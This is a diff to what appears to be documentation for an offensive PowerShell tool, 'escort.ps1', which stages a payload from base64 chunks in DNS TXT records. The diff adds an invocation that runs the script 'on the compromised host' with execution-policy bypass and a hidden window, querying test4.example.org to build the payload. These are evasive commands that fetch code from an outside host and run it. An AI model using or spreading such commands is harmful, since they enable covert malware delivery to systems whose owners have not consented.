@@ -36,10 +36,11 @@ test4   IN TXT   "TJFda/JAEIXv318xF3mbXUyWJH5QDRHa0BahqDRCL8SLmAxma4xiRjSo/71svu
 test4   IN TXT   "Z4IXES+BPJm9ZtI9ltuE1nsw2TYoKkWoRzOJ1GG2VqcQLVAnO+MmGG8xOZFZj8CB11NrtXAf0eQA6dIAdzjEX85AS1RyDXo8UhMp9SYoLa6TVaFQilmivCon9BbQHFt9HSchaH8My2rq5Tqt9T095wvjdbf7ET/c5Mv7vNwAA//8="
 ```
 
-On the compromised host you would run `escort.ps1 as follows:
+On the compromised host you would run `escort.ps1` using one of the following:
 
 ```
 $> .\escort.ps1 -host_name test4.example.org -dns_server 127.0.0.1
+$> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File escort.ps1 -host_name test4.example.org -dns_server 127.0.0.1
 ```
 
 This will query the host `test4.example.org` for TXT records and use that to construct the payload.
